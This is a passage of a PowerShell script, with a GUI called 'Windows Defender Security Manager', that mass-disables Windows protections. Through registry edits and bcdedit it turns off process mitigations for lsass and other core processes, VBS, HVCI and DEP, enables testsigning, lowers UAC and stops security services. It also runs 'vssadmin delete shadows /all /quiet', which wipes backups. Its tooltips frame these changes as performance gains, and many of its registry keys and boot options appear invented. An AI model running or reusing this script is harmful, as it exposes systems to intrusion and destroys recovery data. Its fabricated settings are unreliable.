        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v "MitigationOptions" /t REG_BINARY /d 0000000000000000 /f

        # Disable dynamic code restrictions
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "RestrictDynamicCode" /t REG_DWORD /d 0 /f

        LogMessage "Runtime Integrity Checks disabled successfully."
    }
    Catch {
        LogMessage "Error disabling runtime integrity checks: $_"
    }
}

# Function to Disable Advanced Process Protection
Function Disable-AdvancedProcessProtection 
{
    Try {
        LogMessage "Disabling Advanced Process Protection..."

        # Disable process protection policies
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableProcessProtection" /t REG_DWORD /d 1 /f
        
        # Disable process mitigation policies
        $processes = @("explorer.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "services.exe")
        foreach ($process in $processes) {
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$process" /v "MitigationOptions" /t REG_BINARY /d 0000000000000000 /f
        }

        # Disable process isolation
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d 0 /f
        
        # Disable process signing requirements
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableProcessSignatureVerification" /t REG_DWORD /d 0 /f

        LogMessage "Advanced Process Protection disabled successfully."
    }
    Catch {
        LogMessage "Error disabling advanced process protection: $_"
    }
}

# Function to Modify System Resource Policies
Function Modify-SystemResourcePolicies 
{
    Try {
        LogMessage "Modifying System Resource Policies..."

        # Disable resource integrity checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnforceResourceIntegrity" /t REG_DWORD /d 0 /f
        
        # Modify memory protection
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d 1 /f

        # Disable system resource protection
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f
        vssadmin delete shadows /all /quiet

        LogMessage "System Resource Policies modified successfully."
    }
    Catch {
        LogMessage "Error modifying system resource policies: $_"
    }
}

# Function to Modify Boot Configuration
Function Modify-BootConfiguration 
{
    Try {
        LogMessage "Modifying Boot Configuration..."

        # Disable boot integrity
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} loadoptions DISABLE-LSA-ISO,DISABLE-VBS" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} nointegritychecks on" -WindowStyle Hidden -Wait
        
        # Disable boot debugging
        Start-Process "bcdedit.exe" -ArgumentList "/debug off" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/bootdebug off" -WindowStyle Hidden -Wait

        # Disable boot verification
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} testsigning on" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} nointegritychecks on" -WindowStyle Hidden -Wait

        LogMessage "Boot Configuration modified successfully."
    }
    Catch {
        LogMessage "Error modifying boot configuration: $_"
    }
}

# Function to Disable Hardware Security
Function Disable-HardwareSecurity 
{
    Try {
        LogMessage "Disabling Hardware-based Security..."

        # Disable hardware-based encryption
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\BitLocker" /v "PreventDeviceEncryption" /t REG_DWORD /d 1 /f
        
        # Disable hardware security features
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios" /v "HypervisorEnforcedCodeIntegrity" /t REG_DWORD /d 0 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
        
        # Disable TPM
        reg add "HKLM\SOFTWARE\Policies\Microsoft\TPM" /v "OSManagedAuthLevel" /t REG_DWORD /d 4 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\TPM" /v "AllowClearTPMWithoutPPI" /t REG_DWORD /d 1 /f

        LogMessage "Hardware-based Security disabled successfully."
    }
    Catch {
        LogMessage "Error disabling hardware security: $_"
    }
}

# Function to Disable Process Isolation and Integrity
Function Disable-ProcessIsolation 
{
    Try {
        LogMessage "Disabling Process Isolation and Integrity..."

        # Disable process isolation policies
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableProcessIsolation" /t REG_DWORD /d 1 /f
        
        # Disable process integrity levels
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableVirtualization" /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f

        # Modify process creation flags
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "DisableExceptionChainValidation" /t REG_DWORD /d 1 /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v "DisableExceptionChainValidation" /t REG_DWORD /d 1 /f

        LogMessage "Process Isolation and Integrity disabled successfully."
    }
    Catch {
        LogMessage "Error disabling process isolation: $_"
    }
}

# Function to Disable System Call Filtering
Function Disable-SystemCallFiltering 
{
    Try {
        LogMessage "Disabling System Call Filtering..."

        # Disable system call filtering
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableSystemCallFiltering" /t REG_DWORD /d 1 /f
        
        # Disable API set restrictions
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableApiSetRestrictions" /t REG_DWORD /d 1 /f

        # Modify system call behavior
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "DisableSystemCallFiltering" /t REG_DWORD /d 1 /f

        LogMessage "System Call Filtering disabled successfully."
    }
    Catch {
        LogMessage "Error disabling system call filtering: $_"
    }
}

# Function to Modify Advanced Memory Management
Function Modify-AdvancedMemoryManagement 
{
    Try {
        LogMessage "Modifying Advanced Memory Management..."

        # Modify memory management settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingCombining" /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemPages" /t REG_DWORD /d 0xffffffff /f

        # Disable memory compression
        Disable-MMAgent -MemoryCompression
        
        # Modify working set parameters
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d 1 /f

        LogMessage "Advanced Memory Management modified successfully."
    }
    Catch {
        LogMessage "Error modifying advanced memory management: $_"
    }
}

# Function to Modify Security Tokens
Function Modify-SecurityTokens 
{
    Try {
        LogMessage "Modifying Security Tokens..."

        # Modify token security settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableRestrictedAdmin" /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableRestrictedAdminOutboundCreds" /t REG_DWORD /d 1 /f
        
        # Modify token filtering
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableTokenFiltering" /t REG_DWORD /d 1 /f
        
        # Disable token security features
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "DisableTokenBinding" /t REG_DWORD /d 1 /f

        LogMessage "Security Tokens modified successfully."
    }
    Catch {
        LogMessage "Error modifying security tokens: $_"
    }
}

# Function to Manipulate Process Tokens
Function Modify-ProcessTokens 
{
    Try {
        LogMessage "Modifying Process Token Controls..."

        # Disable token security checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableTokenSecurityChecks" /t REG_DWORD /d 1 /f
        
        # Modify token privileges
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisablePrivilegeChecks" /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableDomainCreds" /t REG_DWORD /d 1 /f

        # Disable token restrictions
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTokenRestrictions" /t REG_DWORD /d 1 /f

        LogMessage "Process Token Controls modified successfully."
    }
    Catch {
        LogMessage "Error modifying process token controls: $_"
    }
}

# Function to Modify System Resource Access
Function Modify-SystemResourceAccess 
{
    Try {
        LogMessage "Modifying System Resource Access Controls..."

        # Disable resource access checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableResourceAccessChecks" /t REG_DWORD /d 1 /f
        
        # Modify access policies
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableResourcePolicies" /t REG_DWORD /d 1 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableRestrictedSids" /t REG_DWORD /d 1 /f

        # Disable resource isolation
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableResourceIsolation" /t REG_DWORD /d 1 /f

        LogMessage "System Resource Access Controls modified successfully."
    }
    Catch {
        LogMessage "Error modifying system resource access: $_"
    }
}

# Function to Modify Security Providers
Function Modify-SecurityProviders 
{
    Try {
        LogMessage "Modifying Security Providers..."

        # Disable security providers
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v "DisableSecurityProviders" /t REG_DWORD /d 1 /f
        
        # Modify authentication packages
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableAuthenticationPackages" /t REG_DWORD /d 1 /f
        
        # Disable security packages
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig" /v "DisableSecurityPackages" /t REG_DWORD /d 1 /f

        LogMessage "Security Providers modified successfully."
    }
    Catch {
        LogMessage "Error modifying security providers: $_"
    }
}

# Function to Disable Low-Level Security Features
Function Disable-LowLevelSecurity 
{
    Try {
        LogMessage "Disabling Low-Level Security Features..."

        # Disable security features
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableSecurityFeatures" /t REG_DWORD /d 1 /f
        
        # Modify security settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
        
        # Disable security checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableSecurityChecks" /t REG_DWORD /d 1 /f

        LogMessage "Low-Level Security Features disabled successfully."
    }
    Catch {
        LogMessage "Error disabling low-level security features: $_"
    }
}

# Function to Disable System Call Interception
Function Disable-SystemCallInterception 
{
    Try {
        LogMessage "Disabling System Call Interception..."

        # Disable system call monitoring
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableSystemCallMonitoring" /t REG_DWORD /d 1 /f
        
        # Disable API hooking
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "DisableAPIHooking" /t REG_DWORD /d 1 /f
        
        # Disable system call auditing
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableSystemCallAuditing" /t REG_DWORD /d 1 /f

        # Modify system call behavior
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableSystemCallFiltering" /t REG_DWORD /d 1 /f

        LogMessage "System Call Interception disabled successfully."
    }
    Catch {
        LogMessage "Error disabling system call interception: $_"
    }
}

# Function to Disable Kernel Security Features
Function Disable-KernelSecurity 
{
    Try {
        LogMessage "Disabling Kernel Security Features..."

        # Disable kernel security checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableKernelSecurityChecks" /t REG_DWORD /d 1 /f
        
        # Disable kernel integrity checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableKernelIntegrityChecks" /t REG_DWORD /d 1 /f

        # Modify kernel security settings
        Start-Process "bcdedit.exe" -ArgumentList "/set kernelintegritychecks off" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set kernelsecuritycheck off" -WindowStyle Hidden -Wait

        LogMessage "Kernel Security Features disabled successfully."
    }
    Catch {
        LogMessage "Error disabling kernel security features: $_"
    }
}

# Function to Bypass Memory Protection
Function Bypass-MemoryProtection 
{
    Try {
        LogMessage "Bypassing Memory Protection..."

        # Disable memory protection features
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableMemoryProtection" /t REG_DWORD /d 1 /f
        
        # Modify memory security settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableMemorySecurityChecks" /t REG_DWORD /d 1 /f
        
        # Disable DEP for all processes
        Start-Process "bcdedit.exe" -ArgumentList "/set nx AlwaysOff" -WindowStyle Hidden -Wait
        
        # Modify memory management
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d 1 /f

        LogMessage "Memory Protection bypassed successfully."
    }
    Catch {
        LogMessage "Error bypassing memory protection: $_"
    }
}

# Function to Modify Security Subsystem
Function Modify-SecuritySubsystem 
{
    Try {
        LogMessage "Modifying Security Subsystem..."

        # Disable security subsystem features
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableSecuritySubsystem" /t REG_DWORD /d 1 /f
        
        # Modify security package settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v "DisableSecurityPackages" /t REG_DWORD /d 1 /f
        
        # Disable security services
        $services = @(
            "SecurityHealthService",
            "wscsvc",              # Windows Security Center
            "SecurityHealthHost"    # Windows Security Health Host
        )
        foreach ($service in $services) {
            Stop-Service $service -Force -ErrorAction SilentlyContinue
            Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
        }

        LogMessage "Security Subsystem modified successfully."
    }
    Catch {
        LogMessage "Error modifying security subsystem: $_"
    }
}

# Function to Disable Process Injection Controls
Function Disable-ProcessInjectionControls 
{
    Try {
        LogMessage "Disabling Process Injection Controls..."

        # Disable process injection protections
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableProcessInjectionProtection" /t REG_DWORD /d 1 /f
        
        # Modify process creation flags
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "DisableInjectionControls" /t REG_DWORD /d 1 /f
        
        # Disable DLL injection protection
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableDLLInjectionProtection" /t REG_DWORD /d 1 /f

        LogMessage "Process Injection Controls disabled successfully."
    }
    Catch {
        LogMessage "Error disabling process injection controls: $_"
    }
}

# Function to Modify System Integrity Policies
Function Modify-SystemIntegrityPolicies 
{
    Try {
        LogMessage "Modifying System Integrity Policies..."

        # Disable system integrity checks
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "DisableIntegrityChecks" /t REG_DWORD /d 1 /f
        
        # Modify integrity policy settings
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableIntegrityPolicies" /t REG_DWORD /d 1 /f
        
        # Disable code integrity
        Start-Process "bcdedit.exe" -ArgumentList "/set nointegritychecks on" -WindowStyle Hidden -Wait

        LogMessage "System Integrity Policies modified successfully."
    }
    Catch {
        LogMessage "Error modifying system integrity policies: $_"
    }
}

# Function to Bypass Additional Security Providers
Function Bypass-SecurityProviders 
{
    Try {
        LogMessage "Bypassing Additional Security Providers..."

        # Disable security provider verification
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v "DisableProviderVerification" /t REG_DWORD /d 1 /f
        
        # Modify authentication settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableAuthenticationProviders" /t REG_DWORD /d 1 /f
        
        # Disable security package validation
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig" /v "DisablePackageValidation" /t REG_DWORD /d 1 /f

        LogMessage "Additional Security Providers bypassed successfully."
    }
    Catch {
        LogMessage "Error bypassing security providers: $_"
    }
}

# Function to Disable Hardware Security Features
Function Disable-HardwareSecurityFeatures 
{
    Try {
        LogMessage "Disabling Hardware Security Features..."

        # Disable hardware-based security
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "DisableHardwareBasedSecurity" /t REG_DWORD /d 1 /f
        
        # Modify hardware security settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v "DisableHardwareEnforcement" /t REG_DWORD /d 1 /f
        
        # Disable hardware-based isolation
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios" /v "DisableHardwareIsolation" /t REG_DWORD /d 1 /f

        # Disable TPM-based security
        reg add "HKLM\SOFTWARE\Policies\Microsoft\TPM" /v "DisableTPMProtection" /t REG_DWORD /d 1 /f

        LogMessage "Hardware Security Features disabled successfully."
    }
    Catch {
        LogMessage "Error disabling hardware security features: $_"
    }
}

# Build the GUI
[void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')
[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')

# Create tooltip provider
$toolTip = New-Object System.Windows.Forms.ToolTip
$toolTip.InitialDelay = 500
$toolTip.ReshowDelay = 200
$toolTip.AutoPopDelay = 10000
$toolTip.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)
$toolTip.ForeColor = [System.Drawing.Color]::White

# Define detailed tooltips for each component
$tooltipDescriptions = @{
    "Real-Time Protection" = "Provides continuous scanning of files and processes. Disabling this will stop active monitoring but may increase system performance."
    
    "Cloud-Delivered Protection" = "Enables cloud-based detection of new threats. Disabling reduces network traffic but may delay detection of new malware."
    
    "Automatic Sample Submission" = "Sends suspicious files to Microsoft for analysis. Disabling improves privacy but may reduce threat detection capabilities."
    
    "Core Isolation Memory Integrity" = "Protects core system processes using virtualization. Disabling may improve compatibility with older software."
    
    "Exploit Protection" = "Prevents common exploit techniques. Disabling reduces memory protection but may improve application compatibility."
    
    "Controlled Folder Access" = "Protects folders from unauthorized changes. Disabling allows more flexible file access but reduces ransomware protection."
    
    "Firewall" = "Controls network traffic. Disabling removes network filtering but may improve connection speeds."
    
    "Network Protection" = "Blocks malicious network connections. Disabling allows unrestricted network access but increases exposure to threats."
    
    "Firewall Advanced Security" = "Provides granular network traffic control. Disabling simplifies network access but reduces network security."
    
    "Advanced Protection Features" = "Enables additional security measures. Disabling reduces system overhead but may expose to sophisticated attacks."
    
    "System Guard" = "Ensures system integrity during boot. Disabling speeds up boot time but reduces boot security."
    
    "Kernel Protection" = "Protects the Windows kernel from modifications. Disabling allows kernel-level changes but reduces core system security."
}

# Create Form with fixed size and scrolling
$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Windows Defender Security Manager"
$Form.Size = New-Object System.Drawing.Size(800, 700) # Fixed reasonable height
$Form.StartPosition = "CenterScreen"
$Form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
$Form.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$Form.Icon = [System.Drawing.SystemIcons]::Shield
$Form.MinimumSize = New-Object System.Drawing.Size(800, 600) # Set minimum size
$Form.MaximizeBox = $true # Allow maximizing

# Create main container panel with scrolling
$containerPanel = New-Object System.Windows.Forms.Panel
$containerPanel.Dock = [System.Windows.Forms.DockStyle]::Fill
$containerPanel.AutoScroll = $true
$Form.Controls.Add($containerPanel)

# Header Panel (Fixed at top)
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Height = 60
$headerPanel.Dock = [System.Windows.Forms.DockStyle]::Top
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$containerPanel.Controls.Add($headerPanel)

# Title Label
$lblTitle = New-Object System.Windows.Forms.Label
$lblTitle.Text = "Windows Defender Security Manager"
$lblTitle.ForeColor = [System.Drawing.Color]::White
$lblTitle.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$lblTitle.AutoSize = $true
$lblTitle.Location = New-Object System.Drawing.Point(20, 15)
$headerPanel.Controls.Add($lblTitle)

# Instructions Panel (Fixed below header)
$instructionsPanel = New-Object System.Windows.Forms.Panel
$instructionsPanel.Height = 50
$instructionsPanel.Dock = [System.Windows.Forms.DockStyle]::Top
$instructionsPanel.BackColor = [System.Drawing.Color]::FromArgb(248, 248, 248)
$instructionsPanel.Padding = New-Object System.Windows.Forms.Padding(20, 10, 20, 10)
$containerPanel.Controls.Add($instructionsPanel)

# Instructions Label
$lblInstructions = New-Object System.Windows.Forms.Label
$lblInstructions.Text = "Select the security components you want to manage. Use caution as changes may affect system security."
$lblInstructions.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$lblInstructions.AutoSize = $true
$lblInstructions.ForeColor = [System.Drawing.Color]::FromArgb(70, 70, 70)
$instructionsPanel.Controls.Add($lblInstructions)

# Scrollable Content Panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.AutoScroll = $true
$contentPanel.Dock = [System.Windows.Forms.DockStyle]::Fill
$contentPanel.Padding = New-Object System.Windows.Forms.Padding(20)
$containerPanel.Controls.Add($contentPanel)

# Create Category Panels with improved layout
$yOffset = 10
foreach ($category in $categories.Keys) {
    # Category Panel with rounded corners and shadow effect
    $categoryPanel = New-Object System.Windows.Forms.GroupBox
    $categoryPanel.Text = $category
    $categoryPanel.Location = New-Object System.Drawing.Point(20, $yOffset)
    $categoryPanel.Size = New-Object System.Drawing.Size(720, 150)
    $categoryPanel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    $categoryPanel.BackColor = [System.Drawing.Color]::White
    $contentPanel.Controls.Add($categoryPanel)

    # Add components to category with improved spacing
    $xPos = 20
    $yPos = 30
    foreach ($component in $categories[$category]) {
        # Component Container with hover effect
        $componentPanel = New-Object System.Windows.Forms.Panel
        $componentPanel.Size = New-Object System.Drawing.Size(220, 50)
        $componentPanel.Location = New-Object System.Drawing.Point($xPos, $yPos)
        $componentPanel.BackColor = [System.Drawing.Color]::White
        $categoryPanel.Controls.Add($componentPanel)

        # Checkbox with improved styling
        $checkbox = New-Object System.Windows.Forms.CheckBox
        $checkbox.Text = $component
        $checkbox.Location = New-Object System.Drawing.Point(5, 5)
        $checkbox.AutoSize = $true
        $checkbox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $componentPanel.Controls.Add($checkbox)

        # Status Label with improved colors
        $statusLabel = New-Object System.Windows.Forms.Label
        $statusLabel.Text = "Status: Checking..."
        $statusLabel.Location = New-Object System.Drawing.Point(20, 25)
        $statusLabel.AutoSize = $true
        $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 8)
        $componentPanel.Controls.Add($statusLabel)

        # Add hover effect
        $componentPanel.Add_MouseEnter({
            $this.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
        })
        $componentPanel.Add_MouseLeave({
            $this.BackColor = [System.Drawing.Color]::White
        })

        $xPos += 235
        if ($xPos > 480) {
            $xPos = 20
            $yPos += 55
        }

        # Enhanced tooltip
        $toolTip.SetToolTip($componentPanel, $tooltipDescriptions[$component])
        $toolTip.SetToolTip($checkbox, $tooltipDescriptions[$component])
    }

    $yOffset += 160
}

# Action Buttons Panel (Fixed at bottom)
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Height = 60
$buttonPanel.Dock = [System.Windows.Forms.DockStyle]::Bottom
$buttonPanel.BackColor = [System.Drawing.Color]::White
$buttonPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$Form.Controls.Add($buttonPanel)

# Apply Button with improved styling
$btnApply = New-Object System.Windows.Forms.Button
$btnApply.Text = "Apply Changes"
$btnApply.Size = New-Object System.Drawing.Size(120, 35)
$btnApply.Location = New-Object System.Drawing.Point(640, 12)
$btnApply.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$btnApply.ForeColor = [System.Drawing.Color]::White
$btnApply.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnApply.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$buttonPanel.Controls.Add($btnApply)

# Refresh Button with improved styling
$btnRefresh = New-Object System.Windows.Forms.Button
$btnRefresh.Text = "↻ Refresh Status"
$btnRefresh.Size = New-Object System.Drawing.Size(120, 35)
$btnRefresh.Location = New-Object System.Drawing.Point(500, 12)
$btnRefresh.BackColor = [System.Drawing.Color]::White
$btnRefresh.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$btnRefresh.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$buttonPanel.Controls.Add($btnRefresh)

# Progress Label
$lblProgress = New-Object System.Windows.Forms.Label
$lblProgress.Text = "Ready"
$lblProgress.AutoSize = $true
$lblProgress.Location = New-Object System.Drawing.Point(20, 20)
$lblProgress.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$lblProgress.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
$buttonPanel.Controls.Add($lblProgress)

# Run initial checks
CheckTamperProtection

# Refresh Status Indicators
RefreshStatus

# Add button click events
$btnApply.Add_Click({
    $disableComponents = $false
    foreach ($checkbox in $script:checkboxes.Values) {
        if ($checkbox.Checked) {
            $disableComponents = $true
            break
        }
    }
    
    if ($disableComponents) {
        DisableDefenderComponents
    } else {
        EnableDefenderComponents
    }
})

$btnRefresh.Add_Click({
    $lblProgress.Text = "Refreshing status..."
    $btnRefresh.Enabled = $false
    RefreshStatus
    $btnRefresh.Enabled = $true
    $lblProgress.Text = "Ready"
})

# Initialize form
$Form.Add_Shown({
    $lblProgress.Text = "Checking initial status..."
    RefreshStatus
    $lblProgress.Text = "Ready"
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
$Form.ShowDialog()

# End of Script
LogMessage "Script execution completed."
